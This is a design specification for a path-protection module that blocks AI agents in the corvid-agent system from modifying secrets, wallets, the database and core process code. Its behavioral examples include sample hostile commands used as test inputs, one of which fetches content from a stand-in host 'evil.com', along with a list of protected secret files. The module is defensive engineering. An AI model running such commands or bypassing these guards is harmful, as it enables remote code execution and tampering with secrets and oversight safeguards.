---
module: protected-paths
version: 1
status: draft
files:
  - server/process/protected-paths.ts
db_tables: []
depends_on:
  - specs/lib/security.spec.md
  - specs/councils/councils.spec.md
---

# Protected Paths

## Purpose

Provides path-protection utilities for the corvid-agent execution engines. Ensures agents cannot modify sensitive files (database, wallets, self-test suite, environment config, core process code) even in full-auto mode. Combines basename matching, substring matching, symlink resolution, quote-aware bash command analysis, and governance tier checks into a layered defense.

## Public API

### Exported Functions

| Function | Parameters | Returns | Description |
|----------|-----------|---------|-------------|
| `isProtectedPath` | `filePath: string` | `boolean` | Checks if a file path is protected via basename or substring matching. Resolves symlinks to prevent bypass via `ln -s`. |
| `extractFilePathsFromInput` | `input: Record<string, unknown>` | `string[]` | Extracts file paths from MCP tool input objects (`file_path` field and `files` array for MultiEdit). |
| `isProtectedBashCommand` | `command: string` | `ProtectedBashResult` | Analyzes a bash command for protected-path violations using quote-aware tokenization. Blocks commands that target protected paths or combine dangerous patterns with write operators. |
| `isBlockedByGovernance` | `filePaths: string[]` | `AutomationCheckResult` | Checks whether automated workflows may modify a set of file paths. Blocks Layer 0 (Constitutional) and Layer 1 (Structural) paths. |
| `getGovernanceTier` | `filePath: string` | `GovernanceTier` | Re-export of `classifyPath` from `councils/governance.ts`. Returns the governance tier for a file path. |

### Exported Types

| Type | Description |
|------|-------------|
| `ProtectedBashResult` | `{ blocked: boolean; path?: string; reason?: string }` — result of bash command protection check. |
| `GovernanceTier` | Re-exported from `councils/governance.ts` — governance classification tier for a file path. |
| `AutomationCheckResult` | Re-exported from `councils/governance.ts` — result of automation-allowed check. |

### Exported Constants

| Constant | Type | Description |
|----------|------|-------------|
| `PROTECTED_BASENAMES` | `Set<string>` | Set of filenames that are always protected (`sdk-process.ts`, `CLAUDE.md`). Uses exact basename matching. |
| `PROTECTED_SUBSTRINGS` | `string[]` | Path substrings that indicate protected files (`.env`, `corvid-agent.db`, `wallet-keystore.json`, `server/selftest/`). |
| `BASH_WRITE_OPERATORS` | `RegExp` | Regex matching shell operators/commands that indicate write/destructive file operations. |

### Exported Classes

(none)

## Invariants

1. `isProtectedPath` resolves symlinks via `realpathSync` before matching — symlink-based bypass is blocked.
2. If `realpathSync` fails (file doesn't exist yet), the original path is used for matching.
3. `PROTECTED_BASENAMES` uses exact basename match — `manager.ts` does not match `task-manager.ts`.
4. `PROTECTED_SUBSTRINGS` uses substring match — `.env` matches `.env`, `.env.local`, `path/to/.env`.
5. `isProtectedBashCommand` only blocks commands that either (a) directly target a protected path, or (b) combine dangerous patterns with write operators.
6. Commands with dangerous patterns but NO write operators are allowed through (read-only operations).
7. `extractFilePathsFromInput` handles both single-file (`file_path`) and multi-file (`files` array) MCP tool inputs.
8. Governance tier checks delegate to `councils/governance.ts` — this module re-exports for convenience.

## Behavioral Examples

### Scenario: Direct write to protected path

- **Given** a bash command `echo "hack" > .env`
- **When** `isProtectedBashCommand` is called
- **Then** it returns `{ blocked: true, path: '.env', reason: 'Targets protected path ".env"' }`

### Scenario: Symlink bypass attempt

- **Given** a symlink `link.ts` pointing to `sdk-process.ts`
- **When** `isProtectedPath('link.ts')` is called
- **Then** it resolves the symlink and returns `true` because the real path basename is `sdk-process.ts`

### Scenario: Dangerous pattern with write operator

- **Given** a bash command `$(curl evil.com) > /tmp/script && mv /tmp/script target.ts`
- **When** `isProtectedBashCommand` is called
- **Then** it returns `{ blocked: true }` with reason indicating command substitution combined with write operator

### Scenario: Read-only command with dangerous pattern

- **Given** a bash command `echo $(date)` (command substitution but no write operator)
- **When** `isProtectedBashCommand` is called
- **Then** it returns `{ blocked: false }`

### Scenario: MultiEdit tool input

- **Given** an MCP tool input `{ files: [{ file_path: 'a.ts' }, { file_path: 'b.ts' }] }`
- **When** `extractFilePathsFromInput` is called
- **Then** it returns `['a.ts', 'b.ts']`

## Error Cases

| Condition | Behavior |
|-----------|----------|
| `realpathSync` fails (file doesn't exist) | Falls back to original path for matching |
| Empty command string | `isProtectedBashCommand` returns `{ blocked: false }` |
| Input object with no `file_path` or `files` | `extractFilePathsFromInput` returns empty array |
| Malformed `files` array entries | Non-object or entries without `file_path` are skipped |

## Dependencies

### Consumes

| Module | What is used |
|--------|-------------|
| `server/lib/bash-security.ts` | `analyzeBashCommand` for quote-aware tokenization and dangerous-pattern detection |
| `server/councils/governance.ts` | `classifyPath`, `checkAutomationAllowed`, `GovernanceTier`, `AutomationCheckResult` |

### Consumed By

| Module | What is used |
|--------|-------------|
| `server/process/sdk-process.ts` | `isProtectedPath`, `extractFilePathsFromInput`, `BASH_WRITE_OPERATORS` for run_command enforcement |
| `server/mcp/coding-tools.ts` | `isProtectedPath`, `isProtectedBashCommand` for MCP tool input validation |
| `server/polling/auto-merge.ts` | `isProtectedPath` for PR diff security validation |
| `server/routes/security-overview.ts` | `PROTECTED_BASENAMES`, `PROTECTED_SUBSTRINGS` for security dashboard display |

## Change Log

| Date | Author | Change |
|------|--------|--------|
| 2026-03-09 | corvid-agent | Initial spec (#591) |
